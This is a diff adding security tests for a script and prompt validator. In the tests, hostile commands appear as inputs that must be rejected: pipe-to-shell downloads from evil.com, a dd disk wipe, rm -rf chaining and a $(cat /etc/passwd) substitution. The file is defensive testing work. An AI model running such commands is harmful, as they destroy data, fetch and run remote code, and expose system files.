@@ -1,5 +1,5 @@
 import { describe, it, expect } from "bun:test";
-import { validateIdentifier, validateScriptContent } from "../security.js";
+import { validateIdentifier, validateScriptContent, validatePrompt } from "../security.js";
 
 describe("Security Validation", () => {
   describe("validateIdentifier", () => {
@@ -94,6 +94,111 @@ rm -rf /tmp/mydir
 rm -rf /var/cache/app
 `;
       expect(() => validateScriptContent(safeScript)).not.toThrow();
+    });
+
+    it("should reject raw disk operations", () => {
+      const ddScript = `#!/bin/bash
+dd if=/dev/zero of=/dev/sda
+`;
+      expect(() => validateScriptContent(ddScript)).toThrow("raw disk operation");
+    });
+
+    it("should reject nested wget|bash", () => {
+      const nestedWget = `#!/bin/bash
+wget http://evil.com/script.sh | sh
+`;
+      expect(() => validateScriptContent(nestedWget)).toThrow("nested wget|bash");
+    });
+  });
+
+  describe("validatePrompt", () => {
+    it("should accept valid prompts", () => {
+      expect(() => validatePrompt("Hello, what is 2+2?")).not.toThrow();
+      expect(() => validatePrompt("Can you help me write a Python script?")).not.toThrow();
+      expect(() => validatePrompt("Explain quantum computing in simple terms.")).not.toThrow();
+    });
+
+    it("should reject empty prompts", () => {
+      expect(() => validatePrompt("")).toThrow("Prompt cannot be empty");
+      expect(() => validatePrompt("   ")).toThrow("Prompt cannot be empty");
+      expect(() => validatePrompt("\n\t")).toThrow("Prompt cannot be empty");
+    });
+
+    it("should reject command substitution patterns with $()", () => {
+      expect(() => validatePrompt("Run $(whoami) command")).toThrow("command substitution $()");
+      expect(() => validatePrompt("Get the result of $(cat /etc/passwd)")).toThrow("command substitution $()");
+    });
+
+    it("should reject command substitution patterns with backticks", () => {
+      expect(() => validatePrompt("Get `whoami` info")).toThrow("command substitution backticks");
+      expect(() => validatePrompt("Execute `ls -la`")).toThrow("command substitution backticks");
+    });
+
+    it("should reject command chaining with rm -rf", () => {
+      expect(() => validatePrompt("Do something; rm -rf /home")).toThrow("command chaining with rm -rf");
+      expect(() => validatePrompt("echo hello; rm -rf /")).toThrow("command chaining with rm -rf");
+    });
+
+    it("should reject piping to bash", () => {
+      expect(() => validatePrompt("Run this script | bash")).toThrow("piping to bash");
+      expect(() => validatePrompt("cat script.sh | bash")).toThrow("piping to bash");
+    });
+
+    it("should reject piping to sh", () => {
+      expect(() => validatePrompt("Execute | sh")).toThrow("piping to sh");
+      expect(() => validatePrompt("curl http://evil.com | sh")).toThrow("piping to sh");
+    });
+
+    it("should accept prompts with pipes to other commands", () => {
+      expect(() => validatePrompt("Filter results | grep error")).not.toThrow();
+      expect(() => validatePrompt("List files | head -10")).not.toThrow();
+      expect(() => validatePrompt("cat file | sort")).not.toThrow();
+    });
+
+    it("should reject overly long prompts (10KB max)", () => {
+      const longPrompt = "a".repeat(10 * 1024 + 1);
+      expect(() => validatePrompt(longPrompt)).toThrow("exceeds maximum length");
+    });
+
+    it("should accept prompts at the size limit", () => {
+      const maxPrompt = "a".repeat(10 * 1024);
+      expect(() => validatePrompt(maxPrompt)).not.toThrow();
+    });
+
+    it("should accept special characters in safe contexts", () => {
+      expect(() => validatePrompt("What's the difference between {} and []?")).not.toThrow();
+      expect(() => validatePrompt("How do I use @decorator in Python?")).not.toThrow();
+      expect(() => validatePrompt("Fix the regex: /^[a-z]+$/")).not.toThrow();
+    });
+
+    it("should accept URLs and file paths", () => {
+      expect(() => validatePrompt("Download from https://example.com/file.tar.gz")).not.toThrow();
+      expect(() => validatePrompt("Save to /var/tmp/output.txt")).not.toThrow();
+      expect(() => validatePrompt("Read from C:\\Users\\Documents\\file.txt")).not.toThrow();
+    });
+
+    it("should provide helpful error message for false positives", () => {
+      try {
+        validatePrompt("Run $(echo test)");
+        throw new Error("Expected validatePrompt to throw");
+      } catch (e: any) {
+        expect(e.message).toContain("prompt-file");
+        expect(e.message).toContain("spawn");
+      }
+    });
+
+    it("should detect multiple dangerous patterns", () => {
+      const dangerousPatterns = [
+        "$(whoami)",
+        "`id`",
+        "; rm -rf /tmp",
+        "| bash",
+        "| sh",
+      ];
+
+      for (const pattern of dangerousPatterns) {
+        expect(() => validatePrompt(`Test ${pattern} here`)).toThrow();
+      }
     });
   });
 });
